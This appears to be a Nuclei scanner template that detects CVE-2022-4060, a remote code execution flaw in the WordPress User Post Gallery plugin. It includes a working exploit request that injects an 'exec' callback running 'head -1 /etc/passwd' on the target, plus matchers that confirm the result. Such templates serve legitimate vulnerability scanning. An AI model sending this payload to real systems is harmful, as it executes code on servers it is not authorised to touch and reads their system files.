id: CVE-2022-4060

info:
  name: WordPress User Post Gallery <=2.19 - Remote Code Execution
  author: theamanrawat
  severity: critical
  description: |
    WordPress User Post Gallery plugin through 2.19 is susceptible to remote code execution. The plugin does not limit which callback functions can be called by users, making it possible for an attacker execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.
  reference:
    - https://wpscan.com/vulnerability/8f982ebd-6fc5-452d-8280-42e027d01b1e
    - https://wordpress.org/plugins/wp-upg/
    - https://nvd.nist.gov/vuln/detail/CVE-2022-4060
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-4060
    cwe-id: CWE-94
    cpe: cpe:2.3:a:odude:user_post_gallery:*:*:*:*:*:*:*:*
    epss-score: 0.01059
  metadata:
    max-request: 1
    verified: true
  tags: unauth,wpscan,cve2022,rce,wordpress,wp-plugin,wp,cve,wp-upg

http:
  - method: GET
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:head+-1+/etc/passwd:NULL:NULL"

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"

      - type: word
        part: header
        words:
          - "application/json"

      - type: word
        part: body
        words:
          - "recordsFiltered"

      - type: status
        status:
          - 200

# Enhanced by md on 2023/03/22
